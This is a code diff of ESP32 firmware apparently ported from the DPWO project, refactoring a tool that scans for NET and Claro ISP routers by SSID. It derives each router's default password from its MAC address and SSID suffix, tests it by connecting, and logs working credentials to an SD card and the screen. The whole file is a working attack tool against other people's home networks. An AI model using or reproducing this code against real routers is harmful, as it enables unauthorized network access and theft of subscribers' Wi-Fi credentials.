@@ -1,9 +1,6 @@
 /*
-  Port of DPWO for ESP32 by pr3y
-
   Originally from https://github.com/caioluders/DPWO
-
-  saves login creds on SD mounted card
+  https://lude.rs/h4ck1ng/NET_2GXXXX_default_password.html
 */
 #include <WiFi.h>
 #include <regex>
@@ -22,19 +19,8 @@ int ap_scanned;
 int total_scanned;
 
 int selectedItem = 0;
-int itemsPerPage = 3;
+const uint itemsPerPage = 3;
 int totalPages = (networksSaved.size() + itemsPerPage - 1) / itemsPerPage;
-
-//Remove : do endereço MAC
-void parse_BSSID(char* bssid_without_colon, const char* bssid) {
-  int j = 0;
-  for (int i = 0; i < strlen(bssid); ++i) {
-    if (bssid[i] != ':') {
-      bssid_without_colon[j++] = bssid[i];
-    }
-  }
-  bssid_without_colon[j] = '\0';
-}
 
 void saveToCSV(const String &filename, const String &csvLine) {
   FS *fs;
@@ -67,7 +53,6 @@ void readFromCSV(const String &filename){
     String line = file.readStringUntil('\n');
     int commaIndex = line.indexOf(',');
     if(commaIndex>=0){
-      // Serial.print(line.substring(0,commaIndex)+":"+line.substring(commaIndex+1));
       String col1 = line.substring(0, commaIndex);
       String col2 = line.substring(commaIndex + 1);
       networksSaved.push_back(std::make_pair(col1, col2));
@@ -76,51 +61,25 @@ void readFromCSV(const String &filename){
   file.close();
 }
 
+//Remove : do endereço MAC
+void parse_BSSID(char* bssid_without_colon, const char* bssid) {
+  int j = 0;
+  for (int i = 0; i < strlen(bssid); ++i) {
+    if (bssid[i] != ':') {
+      bssid_without_colon[j++] = bssid[i];
+    }
+  }
+  bssid_without_colon[j] = '\0';
+}
 
 bool alreadyScanned(const String& wifi_ssid) {
   return find(networksScanned.begin(), networksScanned.end(), wifi_ssid) != networksScanned.end();
 }
 
-void net_ap(int i) {
+void Claro_Net_ap(int i) {
   char bssid_without_colon[18];
   parse_BSSID(bssid_without_colon, WiFi.BSSIDstr(i).c_str());
-  Serial.println("MAC addr");
-  Serial.println(bssid_without_colon);
-  char *bssid_ready = bssid_without_colon + 4;
-  bssid_ready[strlen(bssid_ready)-2] = '\0';
-  int ssid_length = WiFi.SSID(i).length();
-  if (ssid_length >= 2) {
-      String last_two = WiFi.SSID(i).substring(ssid_length - 2);
-      strcat(bssid_ready, last_two.c_str());
-  } else {
-      Serial.println("ERROR");
-  }
-  WiFi.begin(WiFi.SSID(i).c_str(), bssid_ready);
-  delay(2000);
-  while (WiFi.status() != WL_CONNECTED) {
-    Serial.println("\nNOPE");
-    WiFi.disconnect();
-    return;
-  }
-  Serial.println("\nWiFi Connected");
-  WiFi.disconnect();
-  networksScanned.push_back(WiFi.SSID(i));
-  //Salvar no SD
-  String csvLine = String(WiFi.SSID(i) + "," + bssid_ready);
-  saveToCSV(SD_CREDS_PATH, csvLine);
 
-  WiFi.disconnect();
-
-  tft.setTextSize(1);
-  tft.setTextColor(FGCOLOR-0x2000);
-  tft.println(String(WiFi.SSID(i) + ":" + bssid_ready).c_str());
-}
-
-void claro_ap(int i) {
-  char bssid_without_colon[18];
-  parse_BSSID(bssid_without_colon, WiFi.BSSIDstr(i).c_str());
-  Serial.println("MAC addr");
-  Serial.println(bssid_without_colon);
   char *bssid_ready = bssid_without_colon + 4;
   bssid_ready[strlen(bssid_ready)-2] = '\0';
   int ssid_length = WiFi.SSID(i).length();
@@ -128,10 +87,14 @@ void claro_ap(int i) {
       String last_two = WiFi.SSID(i).substring(ssid_length - 2);
       strcat(bssid_ready, last_two.c_str());
   }
+
+  Serial.println("MAC addr");
+  Serial.println(bssid_without_colon);
   Serial.println("Password:");
   Serial.println(bssid_ready);
   Serial.println("strlen:");
   Serial.println(strlen(bssid_ready));
+
   WiFi.begin(WiFi.SSID(i).c_str(), bssid_ready);
   delay(2000);
   while (WiFi.status() != WL_CONNECTED) {
@@ -144,11 +107,8 @@ void claro_ap(int i) {
   //Salvar no SD
   String csvLine = String(WiFi.SSID(i) + "," + bssid_ready);
   saveToCSV(SD_CREDS_PATH,csvLine);
+  networksSaved.push_back(std::make_pair(WiFi.SSID(i),bssid_ready));
   WiFi.disconnect();
-
-  tft.setTextSize(1);
-  tft.setTextColor(FGCOLOR-0x2000);
-  tft.println(String(WiFi.SSID(i) + ":" + bssid_ready).c_str());
 }
 
 void dpwoSetup(){
@@ -188,12 +148,13 @@ void dpwoRun() {
       }
       if (std::regex_search(WiFi.SSID(i).c_str(), net_regex)) {
         Serial.println("NET SSID");
-        net_ap(i);
+        Claro_Net_ap(i);
       } else if (std::regex_search(WiFi.SSID(i).c_str(), claro_regex)) {
         Serial.println("CLARO SSID");
-        claro_ap(i);
+        Claro_Net_ap(i);
 
       } else {
+        Serial.println(WiFi.BSSIDstr(i).c_str());
         Serial.println("Not Vuln");
       }
       networksScanned.push_back(WiFi.SSID(i));
@@ -216,8 +177,8 @@ void dpwoRun() {
 
 void drawDPWOinfo(){
   tft.setTextSize(FM);
-  tft.setCursor(30,42);tft.print("Scanned: " +  String(total_scanned));
-  tft.setCursor(30,tft.getCursorY()+20);tft.print("Found: "+ String(networksSaved.size()));
+  tft.setCursor(30,42);tft.print("Escaneados: " +  String(total_scanned));
+  tft.setCursor(30,tft.getCursorY()+20);tft.print("Salvos: "+ String(networksSaved.size()));
 }
 
 void drawSDinfo(){
@@ -240,12 +201,11 @@ void drawSDinfo(){
         tft.setTextColor(FGCOLOR);
     }
     Serial.println(networksSaved[index].first.c_str());
-    // tft.setCursor(30, (30 * i));
-    // tft.printf("%s:%s", networksSaved[index].first.c_str(), networksSaved[index].second.c_str());
     tft.setCursor(30,(40*i)+10);tft.print(networksSaved[index].first.c_str());
     tft.setCursor(30,(40*i)+30);tft.print(networksSaved[index].second.c_str());
   }
 }
+
 void drawSDinfoLoop(){
   if(Keyboard.isKeyPressed(';')){
     Serial.println(selectedItem);
